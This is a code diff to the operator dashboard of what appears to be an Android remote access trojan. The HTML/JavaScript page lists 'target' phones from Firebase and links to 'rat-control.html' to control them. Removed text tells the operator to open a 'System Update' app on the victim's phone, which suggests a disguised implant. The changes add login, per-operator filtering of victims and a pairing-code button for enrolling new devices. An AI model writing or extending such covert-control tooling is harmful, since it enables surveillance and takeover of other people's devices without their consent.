@@ -10,15 +10,30 @@
             background: #0a0e27;
             color: #e0e8ff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0; padding: 0; display: block; min-height: 100vh;
+            min-height: 100vh;
         }
-        .container {
-            max-width: 480px; margin: auto; padding: 20px 16px;
-        }
+        .container { max-width: 480px; margin: auto; padding: 20px 16px; }
         h1 {
             font-size: 28px; color: #4a9eff; margin-bottom: 20px;
             font-weight: 800; letter-spacing: 1px;
             text-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
+        }
+        .btn-pairing {
+            width: 100%;
+            padding: 14px;
+            border: 2px dashed #4a9eff;
+            background: rgba(74, 158, 255, 0.1);
+            color: #4a9eff;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-bottom: 16px;
+        }
+        .btn-pairing:hover {
+            background: rgba(74, 158, 255, 0.2);
+            border-style: solid;
         }
         .device-item {
             background: #111a3a;
@@ -106,6 +121,10 @@
     <div class="container">
         <h1>Device Target</h1>
 
+        <button class="btn-pairing" onclick="location.href='pairing.html'">
+            🔗 Generate Pairing Code
+        </button>
+
         <div id="deviceList">
             <div class="empty-state">
                 <span class="icon">📱</span>
@@ -118,83 +137,98 @@
     </div>
 
     <script type="module">
-        import { db, ref, onValue } from './firebase-config.js';
+        import { auth, onAuthStateChanged, db, ref, onValue } from './firebase-config.js';
 
         const listEl = document.getElementById('deviceList');
         const TIMEOUT_MS = 30000;
+        let currentUid = null;
 
-        const targetsRef = ref(db, 'targets');
-
-        onValue(targetsRef, (snapshot) => {
-            const data = snapshot.val();
-            const now = Date.now();
-            let html = '';
-            let count = 0;
-
-            if (data && Object.keys(data).length > 0) {
-                for (const key in data) {
-                    const target = data[key];
-                    if (!target || !target.name) continue;
-
-                    let isOnline = false;
-                    if (target.timestamp) {
-                        const diff = now - target.timestamp;
-                        isOnline = diff < TIMEOUT_MS && target.status === 'online';
-                    }
-
-                    const statusClass = isOnline ? 'status-online' : 'status-offline';
-                    const statusText = isOnline ? '● Online' : '● Offline';
-                    const itemClass = isOnline ? '' : 'offline';
-                    const disabledAttr = isOnline ? '' : 'disabled';
-
-                    html += `
-                        <div class="device-item ${itemClass}">
-                            <div class="info">
-                                <div class="name">${escapeHtml(target.name)}</div>
-                                <div class="os">${escapeHtml(target.os || '- - -')}</div>
-                                <div class="status ${statusClass}">${statusText}</div>
-                            </div>
-                            <div class="actions">
-                                <button class="btn-control" ${disabledAttr}
-                                    data-target="${key}"
-                                    data-online="${isOnline}">
-                                    KONTROL
-                                </button>
-                            </div>
-                        </div>
-                    `;
-                    count++;
-                }
+        onAuthStateChanged(auth, (user) => {
+            if (!user) {
+                window.location.href = 'login.html';
+                return;
             }
+            currentUid = user.uid;
+            loadDevices();
+        });
 
-            if (count === 0) {
-                listEl.innerHTML = `
-                    <div class="empty-state">
-                        <span class="icon">📱</span>
-                        Belum ada perangkat target yang terhubung.<br><br>
-                        Buka aplikasi <b>System Update</b> di HP target.
-                    </div>
-                `;
-            } else {
-                listEl.innerHTML = html;
+        function loadDevices() {
+            if (!currentUid) return;
 
-                // Pasang event listener ke tombol kontrol
-                document.querySelectorAll('.btn-control').forEach(function(btn) {
-                    btn.addEventListener('click', function(e) {
-                        e.stopPropagation();
-                        const targetId = this.dataset.target;
-                        const isOnline = this.dataset.online === 'true';
+            const targetsRef = ref(db, 'targets');
+            onValue(targetsRef, (snapshot) => {
+                const data = snapshot.val();
+                const now = Date.now();
+                let html = '';
+                let count = 0;
 
-                        if (!isOnline) {
-                            alert('❌ Target sedang offline. Tunggu sampai online lagi.');
-                            return;
+                if (data && Object.keys(data).length > 0) {
+                    for (const key in data) {
+                        const target = data[key];
+                        if (!target || !target.name) continue;
+
+                        if (target.owner_uid !== currentUid) continue;
+
+                        let isOnline = false;
+                        if (target.timestamp) {
+                            const diff = now - target.timestamp;
+                            isOnline = diff < TIMEOUT_MS && target.status === 'online';
                         }
 
-                        window.location.href = 'rat-control.html?target=' + targetId;
+                        const statusClass = isOnline ? 'status-online' : 'status-offline';
+                        const statusText = isOnline ? '● Online' : '● Offline';
+                        const itemClass = isOnline ? '' : 'offline';
+                        const disabledAttr = isOnline ? '' : 'disabled';
+
+                        html += `
+                            <div class="device-item ${itemClass}">
+                                <div class="info">
+                                    <div class="name">${escapeHtml(target.name)}</div>
+                                    <div class="os">${escapeHtml(target.os || '- - -')}</div>
+                                    <div class="status ${statusClass}">${statusText}</div>
+                                </div>
+                                <div class="actions">
+                                    <button class="btn-control" ${disabledAttr}
+                                        data-target="${key}"
+                                        data-online="${isOnline}">
+                                        KONTROL
+                                    </button>
+                                </div>
+                            </div>
+                        `;
+                        count++;
+                    }
+                }
+
+                if (count === 0) {
+                    listEl.innerHTML = `
+                        <div class="empty-state">
+                            <span class="icon">📱</span>
+                            Belum ada perangkat target.<br><br>
+                            Klik <b>Generate Pairing Code</b> di atas<br>
+                            untuk menghubungkan device baru.
+                        </div>
+                    `;
+                } else {
+                    listEl.innerHTML = html;
+
+                    document.querySelectorAll('.btn-control').forEach(function(btn) {
+                        btn.addEventListener('click', function(e) {
+                            e.stopPropagation();
+                            const targetId = this.dataset.target;
+                            const isOnline = this.dataset.online === 'true';
+
+                            if (!isOnline) {
+                                alert('❌ Target sedang offline.');
+                                return;
+                            }
+
+                            window.location.href = 'rat-control.html?target=' + targetId;
+                        });
                     });
-                });
-            }
-        });
+                }
+            });
+        }
 
         function escapeHtml(text) {
             const div = document.createElement('div');
